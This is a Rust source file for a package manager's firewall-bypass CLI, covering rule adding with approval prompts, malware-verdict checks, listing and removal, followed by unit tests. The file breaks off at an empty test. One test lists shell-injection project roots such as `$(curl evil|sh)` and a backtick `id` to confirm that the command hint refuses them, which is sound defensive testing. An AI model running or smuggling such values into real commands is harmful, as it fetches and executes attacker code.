//! `lpm firewall bypass`: exceptions that let specific package versions past
//! LPM Firewall blocks without turning the firewall off.

use crate::firewall_bypass::{
    AddedVerdict, BlockClass, BypassKind, FirewallBypassRule, FirewallBypassScope,
    FirewallBypassSpec, MAX_SPECS_PER_APPROVAL, bypass_add_command, forced_floor_refuses_additions,
    project_policy_root_text, rule_json, shell_safe_in_double_quotes, spec_shell_safe,
    visible_root,
};
use crate::install_ui;
use crate::security_approval;
use clap::Subcommand;
use lpm_common::{LpmError, Timestamp};
use lpm_registry::RegistryClient;
use lpm_registry::client::{
    AuthPosture, NpmFirewallAction, NpmFirewallBatchPackage, NpmFirewallDecision,
};
use std::collections::HashMap;
use std::path::{Path, PathBuf};

const BYPASS_SCHEMA_VERSION: u32 = 1;

#[derive(Debug, Subcommand)]
pub enum FirewallCmd {
    /// Let specific package versions past LPM Firewall blocks, without
    /// turning the firewall off.
    Bypass {
        #[command(subcommand)]
        action: BypassCmd,
    },
}

#[derive(Debug, Subcommand)]
pub enum BypassCmd {
    /// Allow package versions that LPM Firewall blocks. Asks for Touch ID,
    /// Windows Hello, or your password.
    ///
    /// A spec is `name` (every version), `name@1.2.3`, or `name@<range>`
    /// such as `react@^18.19.0`. Name and range rules never cover malware or
    /// unscanned versions; an exact version covers malware only with
    /// `--allow-malware`.
    Add {
        #[arg(required = true, value_name = "SPEC")]
        specs: Vec<String>,

        /// Apply only in this project (the current one when no path is given)
        /// instead of in every project.
        #[arg(long, value_name = "PATH", num_args = 0..=1, default_missing_value = ".")]
        project: Option<PathBuf>,

        /// Remove the rule after this long (`30m`, `12h`, `30d`).
        #[arg(long, value_name = "DURATION")]
        ttl: Option<String>,

        /// A note `lpm firewall bypass list` shows with the rule.
        #[arg(long, value_name = "TEXT")]
        reason: Option<String>,

        /// Also allow an exact version that LPM Firewall flags as malware.
        #[arg(long)]
        allow_malware: bool,
    },

    /// Show bypass rules.
    #[command(visible_alias = "ls")]
    List {
        /// Only rules for this project (the current one when no path is given).
        #[arg(
            long,
            value_name = "PATH",
            num_args = 0..=1,
            default_missing_value = ".",
            conflicts_with = "global"
        )]
        project: Option<PathBuf>,

        /// Only rules for every project.
        #[arg(long)]
        global: bool,
    },

    /// Remove bypass rules by spec or id. Needs no approval.
    #[command(visible_alias = "rm")]
    Remove {
        #[arg(required = true, value_name = "SPEC_OR_ID")]
        targets: Vec<String>,

        /// Remove this project's rule (the current one when no path is given)
        /// instead of the rule for every project.
        #[arg(long, value_name = "PATH", num_args = 0..=1, default_missing_value = ".")]
        project: Option<PathBuf>,
    },

    /// Remove every bypass rule, or only the global or one project's. Needs
    /// no approval.
    Clear {
        /// Only this project's rules (the current one when no path is given).
        #[arg(
            long,
            value_name = "PATH",
            num_args = 0..=1,
            default_missing_value = ".",
            conflicts_with = "global"
        )]
        project: Option<PathBuf>,

        /// Only the rules for every project.
        #[arg(long)]
        global: bool,
    },
}

pub async fn run(
    cmd: &FirewallCmd,
    client: &RegistryClient,
    cwd: &Path,
    json_output: bool,
) -> Result<(), LpmError> {
    let FirewallCmd::Bypass { action } = cmd;
    match action {
        BypassCmd::Add {
            specs,
            project,
            ttl,
            reason,
            allow_malware,
        } => {
            let request = AddRequest {
                specs,
                project: project.as_deref(),
                ttl: ttl.as_deref(),
                reason: reason.as_deref(),
                allow_malware: *allow_malware,
            };
            add(client, cwd, &request, json_output).await
        }
        BypassCmd::List { project, global } => list(cwd, project.as_deref(), *global, json_output),
        BypassCmd::Remove { targets, project } => {
            remove(cwd, targets, project.as_deref(), json_output)
        }
        BypassCmd::Clear { project, global } => {
            clear(cwd, project.as_deref(), *global, json_output)
        }
    }
}

struct AddRequest<'a> {
    specs: &'a [String],
    project: Option<&'a Path>,
    ttl: Option<&'a str>,
    reason: Option<&'a str>,
    allow_malware: bool,
}

/// Where a rule applies: every project, or one project root.
struct RuleScope {
    scope: FirewallBypassScope,
    project_root: Option<String>,
}

impl RuleScope {
    fn resolve(cwd: &Path, project: Option<&Path>) -> Result<Self, LpmError> {
        match project {
            None => Ok(Self {
                scope: FirewallBypassScope::Global,
                project_root: None,
            }),
            Some(path) => Ok(Self {
                scope: FirewallBypassScope::Project,
                project_root: Some(project_policy_root_text(&cwd.join(path))?),
            }),
        }
    }

    fn holds(&self, rule: &FirewallBypassRule) -> bool {
        rule.scope == self.scope && rule.project_root == self.project_root
    }

    fn describe(&self) -> String {
        match &self.project_root {
            None => "in every project".to_string(),
            Some(root) => format!("in the project at {}", visible_root(root)),
        }
    }
}

fn parse_specs(raw_specs: &[String]) -> Result<Vec<FirewallBypassSpec>, LpmError> {
    let mut specs: Vec<FirewallBypassSpec> = Vec::with_capacity(raw_specs.len());
    for raw in raw_specs {
        let spec = FirewallBypassSpec::parse(raw).map_err(|error| {
            LpmError::InvalidPackageName(format!(
                "`{}`: {error}",
                lpm_common::sanitize_server_text(raw, 120)
            ))
        })?;
        if !specs
            .iter()
            .any(|existing| existing.to_string() == spec.to_string())
        {
            specs.push(spec);
        }
    }
    Ok(specs)
}

/// The verdict LPM Firewall gives an exact version right now, as `add`
/// shows it before asking for approval.
enum Preview {
    Blocked(Box<NpmFirewallDecision>),
    NotBlocked,
    Unavailable(String),
}

async fn preview_exact_specs(
    client: &RegistryClient,
    specs: &[FirewallBypassSpec],
    profile: lpm_registry::client::NpmFirewallPolicyProfile,
) -> HashMap<String, Preview> {
    let packages: Vec<NpmFirewallBatchPackage> = specs
        .iter()
        .filter(|spec| spec.kind() == BypassKind::Exact)
        .filter_map(|spec| {
            Some(NpmFirewallBatchPackage {
                name: spec.name().to_string(),
                version: spec.version_text()?,
                integrity: None,
                published_at: None,
            })
        })
        .collect();
    let mut previews = HashMap::with_capacity(packages.len());
    if packages.is_empty() {
        return previews;
    }
    match client
        .npm_firewall_batch_verdicts_with_posture_and_policy(
            &packages,
            AuthPosture::AuthRequired,
            Some(profile),
        )
        .await
    {
        Ok(response) => {
            let unnamed_blocks = response.summary.block
                > response
                    .decisions
                    .iter()
                    .filter(|decision| decision.action == NpmFirewallAction::Block)
                    .count() as u64;
            let mut blocked: HashMap<(String, String), NpmFirewallDecision> = response
                .decisions
                .into_iter()
                .filter(|decision| decision.action == NpmFirewallAction::Block)
                .map(|decision| ((decision.name.clone(), decision.version.clone()), decision))
                .collect();
            for package in packages {
                let key = (package.name, package.version);
                let preview = match blocked.remove(&key) {
                    Some(decision) => Preview::Blocked(Box::new(decision)),
                    None if unnamed_blocks => Preview::Unavailable(
                        "LPM Firewall counted a block without naming the version".to_string(),
                    ),
                    None => Preview::NotBlocked,
                };
                previews.insert(format!("{}@{}", key.0, key.1), preview);
            }
        }
        Err(error) => {
            let reason = lpm_common::sanitize_server_text(&error.to_string(), 200);
            for package in packages {
                previews.insert(
                    format!("{}@{}", package.name, package.version),
                    Preview::Unavailable(reason.clone()),
                );
            }
        }
    }
    previews
}

fn block_class_of(decision: &NpmFirewallDecision) -> BlockClass {
    BlockClass::of(
        &decision.verdict,
        decision.policy.as_ref().map(|policy| policy.group.as_str()),
    )
}

/// Refuses a spec whose current block its rule could not lift, and
/// `--allow-malware` for anything but a version LPM Firewall currently
/// blocks as malware.
fn check_previews(
    specs: &[FirewallBypassSpec],
    previews: &HashMap<String, Preview>,
    allow_malware: bool,
) -> Result<(), LpmError> {
    for spec in specs {
        let coordinate = spec.to_string();
        let preview = previews.get(&coordinate);
        let class = match preview {
            Some(Preview::Blocked(decision)) => Some(block_class_of(decision)),
            _ => None,
        };
        if class == Some(BlockClass::ServerReview) {
            return Err(LpmError::SecurityFloor(format!(
                "{coordinate} is held for LPM review, which a local rule can't lift"
            )));
        }
        if class == Some(BlockClass::Malware) && !allow_malware {
            return Err(LpmError::SecurityFloor(format!(
                "LPM Firewall blocks {coordinate} as malware; a rule covers that only when added with `--allow-malware`"
            )));
        }
        if allow_malware && class != Some(BlockClass::Malware) {
            return Err(LpmError::SecurityFloor(match preview {
                Some(Preview::Unavailable(reason)) => format!(
                    "couldn't check the current verdict for {coordinate} ({reason}); `--allow-malware` needs LPM Firewall to report the malware verdict first"
                ),
                _ => format!(
                    "LPM Firewall doesn't block {coordinate} as malware; run the command without `--allow-malware`"
                ),
            }));
        }
    }
    Ok(())
}

fn added_verdict(preview: Option<&Preview>) -> Option<AddedVerdict> {
    let Some(Preview::Blocked(decision)) = preview else {
        return None;
    };
    Some(AddedVerdict {
        verdict: decision.verdict.clone(),
        block_class: block_class_of(decision).as_str().to_string(),
        policy_group: decision.policy.as_ref().map(|policy| policy.group.clone()),
        report_url: decision
            .display
            .as_ref()
            .and_then(|display| display.report_url.clone()),
    })
}

/// The command a person runs to add `specs` in `scope` with the same
/// duration and malware coverage, or `None` when a spec or the project root
/// can't be written into a shell command unchanged. The `--reason` note is left out:
/// it's free text, and the person can add it again.
fn add_command_hint(
    specs: &[&FirewallBypassSpec],
    scope: &RuleScope,
    ttl_secs: Option<u64>,
    allow_malware: bool,
) -> Option<String> {
    let coordinates: Vec<String> = specs.iter().map(ToString::to_string).collect();
    if !coordinates
        .iter()
        .all(|coordinate| spec_shell_safe(coordinate))
    {
        return None;
    }
    let mut command = bypass_add_command(coordinates.iter().map(String::as_str));
    if let Some(root) = &scope.project_root {
        if !shell_safe_in_double_quotes(root) {
            return None;
        }
        command.push_str(" --project \"");
        command.push_str(root);
        command.push('"');
    }
    if let Some(ttl_secs) = ttl_secs {
        command.push_str(" --ttl ");
        command.push_str(&ttl_argument(ttl_secs));
    }
    if allow_malware {
        command.push_str(" --allow-malware");
    }
    Some(command)
}

/// `ttl_secs` as `--ttl` reads it back: whole days, hours or minutes, else
/// bare seconds.
fn ttl_argument(ttl_secs: u64) -> String {
    for (unit_secs, suffix) in [(86_400, 'd'), (3_600, 'h'), (60, 'm')] {
        if ttl_secs.is_multiple_of(unit_secs) {
            return format!("{}{suffix}", ttl_secs / unit_secs);
        }
    }
    ttl_secs.to_string()
}

/// The native prompt: what is allowed, where, and for how long. Built only
/// from validated specs and fixed text.
fn approval_prompt(
    specs: &[&FirewallBypassSpec],
    scope: &RuleScope,
    ttl_secs: Option<u64>,
    allow_malware: bool,
) -> String {
    let mut prompt = match specs {
        [spec] => format!("Allow {}", spec.describe()),
        _ => format!("Allow {} packages", specs.len()),
    };
    if allow_malware {
        prompt.push_str(", including a malware verdict,");
    }
    prompt.push_str(" past LPM Firewall ");
    prompt.push_str(&scope.describe());
    if let Some(ttl_secs) = ttl_secs {
        prompt.push_str(" for ");
        prompt.push_str(&security_approval::format_unlock_duration(ttl_secs));
    }
    if specs.len() > 1 {
        prompt.push_str(": ");
        prompt.push_str(
            &specs
                .iter()
                .map(|spec| spec.describe())
                .collect::<Vec<_>>()
                .join(", "),
        );
    }
    prompt
}

/// The longest prompt one approval shows; longer requests ask more than once.
const MAX_APPROVAL_PROMPT_CHARS: usize = 320;

/// `specs` split into approvals of at most [`MAX_SPECS_PER_APPROVAL`] specs
/// whose prompt stays within [`MAX_APPROVAL_PROMPT_CHARS`], so each prompt
/// names everything it approves in full. A spec too long to share a prompt
/// gets one of its own.
fn approval_batches<'a>(
    specs: &[&'a FirewallBypassSpec],
    prompt_for: impl Fn(&[&FirewallBypassSpec]) -> String,
) -> Vec<Vec<&'a FirewallBypassSpec>> {
    let mut batches: Vec<Vec<&FirewallBypassSpec>> = Vec::new();
    let mut current: Vec<&FirewallBypassSpec> = Vec::with_capacity(MAX_SPECS_PER_APPROVAL);
    for spec in specs {
        current.push(spec);
        if current.len() > 1
            && (current.len() > MAX_SPECS_PER_APPROVAL
                || prompt_for(&current).chars().count() > MAX_APPROVAL_PROMPT_CHARS)
        {
            current.pop();
            batches.push(std::mem::replace(
                &mut current,
                Vec::with_capacity(MAX_SPECS_PER_APPROVAL),
            ));
            current.push(spec);
        }
    }
    if !current.is_empty() {
        batches.push(current);
    }
    batches
}

fn print_add_request(
    specs: &[FirewallBypassSpec],
    previews: &HashMap<String, Preview>,
    scope: &RuleScope,
) {
    install_ui::warn_untrusted(&format!("LPM Firewall bypass {}:", scope.describe()));
    for spec in specs {
        match previews.get(&spec.to_string()) {
            Some(Preview::Blocked(decision)) => {
                crate::commands::install::print_npm_firewall_decisions(&[decision.as_ref()]);
            }
            Some(Preview::NotBlocked) => install_ui::detail_line(install_ui::terminal_line!(
                "  › {} - {}",
                install_ui::field(&spec.to_string()),
                install_ui::dim("not blocked by LPM Firewall right now"),
            )),
            Some(Preview::Unavailable(reason)) => {
                install_ui::detail_line(install_ui::terminal_line!(
                    "  › {} - {}",
                    install_ui::field(&spec.to_string()),
                    install_ui::dim(&format!("current verdict unavailable: {reason}")),
                ));
            }
            None => install_ui::detail_line(install_ui::terminal_line!(
                "  › {} - {}",
                install_ui::field(&spec.describe()),
                install_ui::dim("never covers malware or unscanned versions"),
            )),
        }
    }
}

fn parse_ttl(ttl: Option<&str>) -> Result<Option<u64>, LpmError> {
    let Some(raw) = ttl else {
        return Ok(None);
    };
    let secs = crate::release_age_config::parse_duration(raw).map_err(|_| invalid_ttl(raw))?;
    if secs == 0 {
        return Err(invalid_ttl(raw));
    }
    Ok(Some(secs))
}

/// When a rule added `now` with `ttl_secs` expires. A duration past the
/// timestamp range is refused rather than saved as a rule that never expires.
fn expiry_after(
    now: Timestamp,
    ttl_secs: Option<u64>,
    raw: &str,
) -> Result<Option<Timestamp>, LpmError> {
    let Some(secs) = ttl_secs else {
        return Ok(None);
    };
    i64::try_from(secs)
        .ok()
        .and_then(|secs| now.checked_add(lpm_common::timestamp::Duration::seconds(secs)))
        .map(Some)
        .ok_or_else(|| invalid_ttl(raw))
}

fn invalid_ttl(raw: &str) -> LpmError {
    LpmError::Registry(format!(
        "invalid `--ttl` value `{}`; use a positive duration such as `30m`, `12h` or `30d`",
        lpm_common::sanitize_server_text(raw, 40)
    ))
}

/// Refuses before any prompt, and records the refusal in the audit log.
fn refuse_add(specs: &[FirewallBypassSpec], error: LpmError) -> LpmError {
    security_approval::record_firewall_bypass_refusal(
        specs.iter().map(ToString::to_string).collect(),
        &error.to_string(),
    );
    error
}

async fn add(
    client: &RegistryClient,
    cwd: &Path,
    request: &AddRequest<'_>,
    json_output: bool,
) -> Result<(), LpmError> {
    let specs = parse_specs(request.specs)?;
    if request.allow_malware
        && let Some(spec) = specs.iter().find(|spec| spec.kind() != BypassKind::Exact)
    {
        return Err(LpmError::InvalidPackageName(format!(
            "`--allow-malware` applies only to exact versions such as `name@1.2.3`; `{spec}` names more"
        )));
    }
    let ttl_secs = parse_ttl(request.ttl)?;
    let now = Timestamp::now();
    let expires_at = expiry_after(now, ttl_secs, request.ttl.unwrap_or_default())?;
    let scope = RuleScope::resolve(cwd, request.project)?;
    let global = crate::commands::config::GlobalConfig::load_checked()?;
    let effective = security_approval::load_effective_authorized_posture()?;
    if let Some(reason) = security_approval::local_firewall_bypass_inactive_reason(&effective) {
        return Err(refuse_add(&specs, LpmError::SecurityFloor(reason)));
    }
    if forced_floor_refuses_additions(&global, &effective)? {
        return Err(refuse_add(
            &specs,
            LpmError::SecurityFloor(
                "`force-security-floor = true` keeps the npm firewall at enforce, so new bypass rules are refused; lower the floor intentionally in ~/.lpm/config.toml first".to_string(),
            ),
        ));
    }

    let previews = if json_output {
        HashMap::new()
    } else {
        let profile = crate::npm_firewall_config::runtime_policy_profile(
            crate::npm_firewall_config::config_policy_request(&global)?,
            &effective,
        );
        let previews = preview_exact_specs(client, &specs, profile).await;
        if let Err(error) = check_previews(&specs, &previews, request.allow_malware) {
            return Err(refuse_add(&specs, error));
        }
        print_add_request(&specs, &previews, &scope);
        previews
    };

    let rules: Vec<FirewallBypassRule> = specs
        .iter()
        .map(|spec| {
            let mut rule = FirewallBypassRule::new(
                spec,
                scope.scope,
                scope.project_root.clone(),
                request.allow_malware,
                now,
            );
            rule.expires_at = expires_at;
            rule.reason = request
                .reason
                .map(|reason| lpm_common::sanitize_server_text(reason, 200));
            rule.added_verdict = added_verdict(previews.get(&spec.to_string()));
            rule
        })
        .collect();
    let sorted = security_approval::sort_firewall_bypass_requests(rules)
        .map_err(|error| refuse_add(&specs, error))?;
    let mut outcome = security_approval::FirewallBypassAdded {
        unchanged: sorted.unchanged,
        rules_total: sorted.rules_total,
        ..security_approval::FirewallBypassAdded::default()
    };
    let mut needs_approval = sorted.needs_approval;
    if !sorted.narrowed.is_empty() {
        let mut narrowed =
            security_approval::save_narrowed_firewall_bypass_rules(&sorted.narrowed)?;
        needs_approval.append(&mut narrowed.needs_approval);
        outcome.absorb(narrowed);
    }

    let mut pending: HashMap<String, FirewallBypassRule> = needs_approval
        .into_iter()
        .map(|rule| (rule.spec.clone(), rule))
        .collect();
    let pending_specs: Vec<&FirewallBypassSpec> = specs
        .iter()
        .filter(|spec| pending.contains_key(&spec.to_string()))
        .collect();
    let command_hint = add_command_hint(&pending_specs, &scope, ttl_secs, request.allow_malware);
    let prompt_for = |batch: &[&FirewallBypassSpec]| {
        approval_prompt(batch, &scope, ttl_secs, request.allow_malware)
    };
    for batch in approval_batches(&pending_specs, prompt_for) {
        let rules = batch
            .iter()
            .filter_map(|spec| pending.remove(&spec.to_string()))
            .collect();
        let prompt = prompt_for(&batch);
        let added = security_approval::add_firewall_bypass_rules(
            security_approval::FirewallBypassApproval {
                rules,
                prompt: &prompt,
                command_hint: command_hint.as_deref(),
                json_output,
            },
        );
        match added {
            Ok(batch_outcome) => outcome.absorb(batch_outcome),
            Err(error) => {
                if !json_output {
                    report_added(&outcome, &scope);
                }
                return Err(error);
            }
        }
    }

    if json_output {
        let as_json = |rules: &[FirewallBypassRule]| {
            rules
                .iter()
                .map(|rule| rule_json(rule, "local", now))
                .collect::<Vec<_>>()
        };
        print_json(&serde_json::json!({
            "schema_version": BYPASS_SCHEMA_VERSION,
            "success": true,
            "added": as_json(&outcome.added),
            "extended": as_json(&outcome.extended),
            "narrowed": as_json(&outcome.narrowed),
            "unchanged": as_json(&outcome.unchanged),
            "count": outcome.added.len() + outcome.extended.len() + outcome.narrowed.len(),
            "rules_total": outcome.rules_total,
        }));
    } else {
        report_added(&outcome, &scope);
    }
    Ok(())
}

fn describe_expiry(rule: &FirewallBypassRule) -> String {
    match rule.expires_at {
        Some(expires_at) => format!("{} (until {})", rule.spec, expires_at.to_rfc3339_seconds()),
        None => format!("{} (no expiry)", rule.spec),
    }
}

fn report_added(outcome: &security_approval::FirewallBypassAdded, scope: &RuleScope) {
    let allowed: Vec<String> = outcome
        .added
        .iter()
        .chain(&outcome.extended)
        .map(describe_expiry)
        .collect();
    if !allowed.is_empty() {
        install_ui::done_untrusted(&format!(
            "LPM Firewall now allows {} {}.",
            allowed.join(", "),
            scope.describe()
        ));
    }
    if !outcome.narrowed.is_empty() {
        let rules: Vec<String> = outcome.narrowed.iter().map(describe_expiry).collect();
        install_ui::done_untrusted(&format!(
            "Updated {} {}.",
            rules.join(", "),
            scope.describe()
        ));
    }
    if !outcome.unchanged.is_empty() {
        let rules: Vec<String> = outcome.unchanged.iter().map(describe_expiry).collect();
        install_ui::done_untrusted(&format!(
            "Already allowed {}, unchanged: {}.",
            scope.describe(),
            rules.join(", ")
        ));
    }
}

fn print_json(value: &serde_json::Value) {
    println!(
        "{}",
        serde_json::to_string_pretty(value).expect("JSON values serialize")
    );
}

fn list(
    cwd: &Path,
    project: Option<&Path>,
    global: bool,
    json_output: bool,
) -> Result<(), LpmError> {
    let effective = security_approval::load_effective_authorized_posture()?;
    let inactive_reason = security_approval::local_firewall_bypass_inactive_reason(&effective);
    let filter = match (project, global) {
        (Some(path), _) => Some(RuleScope::resolve(cwd, Some(path))?),
        (None, true) => Some(RuleScope::resolve(cwd, None)?),
        (None, false) => None,
    };
    let mut rules = security_approval::load_local_firewall_bypass_rules()?;
    if let Some(filter) = &filter {
        rules.retain(|rule| filter.holds(rule));
    }
    let now = Timestamp::now();
    let global = crate::commands::config::GlobalConfig::load_checked()?;
    let approved_mode = effective.posture.firewall_mode();
    let firewall_mode = crate::npm_firewall_config::runtime_request_mode(&global)?
        .map_or(approved_mode, |request| {
            request.mode().stricter(approved_mode)
        });

    if json_output {
        print_json(&serde_json::json!({
            "schema_version": BYPASS_SCHEMA_VERSION,
            "success": true,
            "firewall_mode": firewall_mode.as_str(),
            "local_rules_apply": inactive_reason.is_none(),
            "inactive_reason": inactive_reason,
            "rules": rules.iter().map(|rule| rule_json(rule, "local", now)).collect::<Vec<_>>(),
            "managed_rules": effective
                .managed_firewall_bypass
                .iter()
                .map(|rule| serde_json::json!({
                    "spec": rule.spec,
                    "covers_malware": rule.covers_malware,
                    "source": "managed",
                }))
                .collect::<Vec<_>>(),
            "count": rules.len(),
        }));
        return Ok(());
    }

    if rules.is_empty() && effective.managed_firewall_bypass.is_empty() {
        install_ui::done("No LPM Firewall bypass rules.");
        return Ok(());
    }
    if let Some(reason) = &inactive_reason {
        install_ui::warn_untrusted(reason);
    }
    if !rules.is_empty() {
        println!("{}", install_ui::section("firewall bypass rules"));
        let mut table = install_ui::Table::new();
        for rule in &rules {
            let scope = match &rule.project_root {
                Some(root) => install_ui::cyan(root),
                None => install_ui::dim("every project"),
            };
            let mut notes = Vec::with_capacity(3);
            if rule.covers_malware {
                notes.push("includes malware".to_string());
            }
            if let Some(expires_at) = rule.expires_at {
                notes.push(if rule.is_expired(now) {
                    "expired".to_string()
                } else {
                    format!("until {}", expires_at.to_rfc3339_seconds())
                });
            }
            if let Some(reason) = &rule.reason {
                notes.push(reason.clone());
            }
            table.row([
                install_ui::field(&rule.spec),
                scope,
                install_ui::dim(&rule.id),
                install_ui::dim(&notes.join(" · ")),
            ]);
        }
        table.print_stdout();
    }
    if !effective.managed_firewall_bypass.is_empty() {
        println!("{}", install_ui::section("managed firewall bypass rules"));
        let mut table = install_ui::Table::new();
        for rule in &effective.managed_firewall_bypass {
            table.row([
                install_ui::field(&rule.spec),
                install_ui::dim(if rule.covers_malware {
                    "includes malware"
                } else {
                    ""
                }),
            ]);
        }
        table.print_stdout();
    }
    Ok(())
}

fn remove(
    cwd: &Path,
    targets: &[String],
    project: Option<&Path>,
    json_output: bool,
) -> Result<(), LpmError> {
    let scope = RuleScope::resolve(cwd, project)?;
    let mut selectors = Vec::with_capacity(targets.len());
    for target in targets {
        let spec = match FirewallBypassSpec::parse(target) {
            Ok(spec) => Some(spec.to_string()),
            Err(_) if is_rule_id(target) => None,
            Err(error) => {
                return Err(LpmError::InvalidPackageName(format!(
                    "`{}`: {error}",
                    lpm_common::sanitize_server_text(target, 120)
                )));
            }
        };
        selectors.push((target, spec));
    }
    let selects = |rule: &FirewallBypassRule, (target, spec): &(&String, Option<String>)| {
        rule.id == **target || (scope.holds(rule) && spec.as_deref() == Some(rule.spec.as_str()))
    };
    let (removed, rules_total) = security_approval::remove_firewall_bypass_rules(
        |rule| selectors.iter().any(|selector| selects(rule, selector)),
        "firewall-bypass-removed",
    )?;
    let not_found: Vec<&String> = selectors
        .iter()
        .filter(|selector| !removed.iter().any(|rule| selects(rule, selector)))
        .map(|(target, _)| *target)
        .collect();
    report_removed(&removed, &not_found, rules_total, json_output);
    Ok(())
}

/// `fwb_` and twelve lowercase hex digits, as [`FirewallBypassRule`] ids are.
fn is_rule_id(target: &str) -> bool {
    target.strip_prefix("fwb_").is_some_and(|hex| {
        hex.len() == 12 && hex.bytes().all(|b| matches!(b, b'0'..=b'9' | b'a'..=b'f'))
    })
}

fn clear(
    cwd: &Path,
    project: Option<&Path>,
    global: bool,
    json_output: bool,
) -> Result<(), LpmError> {
    let filter = match (project, global) {
        (Some(path), _) => Some(RuleScope::resolve(cwd, Some(path))?),
        (None, true) => Some(RuleScope::resolve(cwd, None)?),
        (None, false) => None,
    };
    let (removed, rules_total) = security_approval::remove_firewall_bypass_rules(
        |rule| filter.as_ref().is_none_or(|filter| filter.holds(rule)),
        "firewall-bypass-cleared",
    )?;
    report_removed(&removed, &[], rules_total, json_output);
    Ok(())
}

fn report_removed(
    removed: &[FirewallBypassRule],
    not_found: &[&String],
    rules_total: usize,
    json_output: bool,
) {
    let now = Timestamp::now();
    if json_output {
        print_json(&serde_json::json!({
            "schema_version": BYPASS_SCHEMA_VERSION,
            "success": true,
            "removed": removed.iter().map(|rule| rule_json(rule, "local", now)).collect::<Vec<_>>(),
            "not_found": not_found,
            "count": removed.len(),
            "rules_total": rules_total,
        }));
        return;
    }
    for target in not_found {
        install_ui::warn_untrusted(&format!("No LPM Firewall bypass rule matches {target}."));
    }
    if removed.is_empty() {
        if not_found.is_empty() {
            install_ui::done("No LPM Firewall bypass rules to remove.");
        }
        return;
    }
    let specs: Vec<&str> = removed.iter().map(|rule| rule.spec.as_str()).collect();
    install_ui::done_untrusted(&format!(
        "Removed LPM Firewall bypass for {}. Copies already installed stay until you reinstall.",
        specs.join(", ")
    ));
}

#[cfg(test)]
mod tests {
    use super::*;

    fn refs(specs: &[FirewallBypassSpec]) -> Vec<&FirewallBypassSpec> {
        specs.iter().collect()
    }

    fn specs(raw: &[&str]) -> Vec<FirewallBypassSpec> {
        parse_specs(
            &raw.iter()
                .map(|spec| (*spec).to_string())
                .collect::<Vec<_>>(),
        )
        .unwrap()
    }

    fn global() -> RuleScope {
        RuleScope {
            scope: FirewallBypassScope::Global,
            project_root: None,
        }
    }

    #[test]
    fn approval_prompt_names_the_version_the_scope_and_the_duration() {
        assert_eq!(
            approval_prompt(&refs(&specs(&["foldrun@32.8.2"])), &global(), None, false),
            "Allow foldrun@32.8.2 past LPM Firewall in every project"
        );
        assert_eq!(
            approval_prompt(
                &refs(&specs(&["foldrun@32.8.2"])),
                &global(),
                Some(30 * 86_400),
                true
            ),
            "Allow foldrun@32.8.2, including a malware verdict, past LPM Firewall in every project for 30d"
        );
    }

    #[test]
    fn approval_prompt_lists_every_spec_of_a_batch() {
        let prompt = approval_prompt(
            &refs(&specs(&["a@1.0.0", "b", "c@^2.0.0"])),
            &global(),
            None,
            false,
        );

        assert_eq!(
            prompt,
            "Allow 3 packages past LPM Firewall in every project: a@1.0.0, every b version, c versions matching ^2.0.0"
        );
    }

    fn project(root: &str) -> RuleScope {
        RuleScope {
            scope: FirewallBypassScope::Project,
            project_root: Some(root.into()),
        }
    }

    #[test]
    fn approval_prompt_names_the_full_project_root_for_a_project_rule() {
        assert_eq!(
            approval_prompt(
                &refs(&specs(&["foldrun"])),
                &project("/work/sil"),
                None,
                false
            ),
            "Allow every foldrun version past LPM Firewall in the project at /work/sil"
        );
    }

    #[test]
    fn approval_prompt_shows_a_long_root_whole_and_its_controls_visibly() {
        let long_root = format!("/work/{}  two  spaces", "d".repeat(200));
        let prompt = approval_prompt(
            &refs(&specs(&["foldrun"])),
            &project(&long_root),
            None,
            false,
        );
        assert!(
            prompt.ends_with(&format!("in the project at {long_root}")),
            "{prompt}"
        );

        let prompt = approval_prompt(
            &refs(&specs(&["foldrun"])),
            &project("/work/a\u{1b}[2Jb"),
            None,
            false,
        );
        assert!(
            prompt.ends_with("in the project at /work/a\\u{1b}[2Jb"),
            "{prompt}"
        );
    }

    #[test]
    fn add_command_hint_quotes_specs_and_names_the_duration() {
        assert_eq!(
            add_command_hint(
                &refs(&specs(&["@scope/pkg@^1.2.0", "foldrun@32.8.2"])),
                &global(),
                Some(30 * 86_400),
                false
            )
            .as_deref(),
            Some("lpm firewall bypass add \"@scope/pkg@^1.2.0\" \"foldrun@32.8.2\" --ttl 30d")
        );
    }

    #[test]
    fn add_command_hint_uses_the_resolved_project_root() {
        assert_eq!(
            add_command_hint(
                &refs(&specs(&["foldrun@32.8.2"])),
                &project("/work/my app"),
                None,
                true
            )
            .as_deref(),
            Some(
                "lpm firewall bypass add \"foldrun@32.8.2\" --project \"/work/my app\" --allow-malware"
            )
        );
    }

    #[test]
    fn add_command_hint_is_left_out_for_a_project_root_a_shell_would_expand() {
        for root in [
            "/work/$(curl evil|sh)",
            "/work/$HOME",
            "/work/`id`",
            "/work/%PATH%",
            "/work/a\"b",
            "/work/a!b",
        ] {
            assert_eq!(
                add_command_hint(
                    &refs(&specs(&["foldrun@32.8.2"])),
                    &project(root),
                    None,
                    false
                ),
                None,
                "{root}"
            );
        }
    }

    #[test]
    fn expiry_that_overflows_the_timestamp_range_is_refused() {
        let now = Timestamp::now();

        assert!(expiry_after(now, Some(1_000_000_000_000), "1000000000000").is_err());
        assert_eq!(expiry_after(now, None, "").unwrap(), None);
        assert!(expiry_after(now, Some(60), "1m").unwrap().is_some());
    }

    #[test]
    fn parse_specs_drops_duplicates_by_canonical_text() {
        assert_eq!(specs(&["react@>=18  <19", "react@>=18 <19"]).len(), 1);
    }

    fn blocked(group: &str, verdict: &str) -> Preview {
        Preview::Blocked(Box::new(
            serde_json::from_value(serde_json::json!({
                "decisionId": "d",
                "name": "foldrun",
                "version": "32.8.2",
                "action": "block",
                "verdict": verdict,
                "reason": "r",
                "matchSource": "package",
                "policyMode": "enforce",
                "policy": { "group": group }
            }))
            .unwrap(),
        ))
    }

    #[test]
    fn previews_refuse_a_malware_block_without_allow_malware() {
        let previews = HashMap::from([(
            "foldrun@32.8.2".to_string(),
            blocked("lpm_ai_confirmed_malware", "malicious"),
        )]);

        let error = check_previews(&specs(&["foldrun@32.8.2"]), &previews, false).unwrap_err();

        assert!(error.to_string().contains("--allow-malware"), "{error}");
        assert!(check_previews(&specs(&["foldrun@32.8.2"]), &previews, true).is_ok());
    }

    #[test]
    fn previews_refuse_allow_malware_for_a_version_not_blocked_as_malware() {
        let previews = HashMap::from([(
            "foldrun@32.8.2".to_string(),
            blocked("lpm_ai_agent_control_surface", "suspicious"),
        )]);

        assert!(check_previews(&specs(&["foldrun@32.8.2"]), &previews, true).is_err());
        assert!(check_previews(&specs(&["foldrun@32.8.2"]), &previews, false).is_ok());
    }

    #[test]
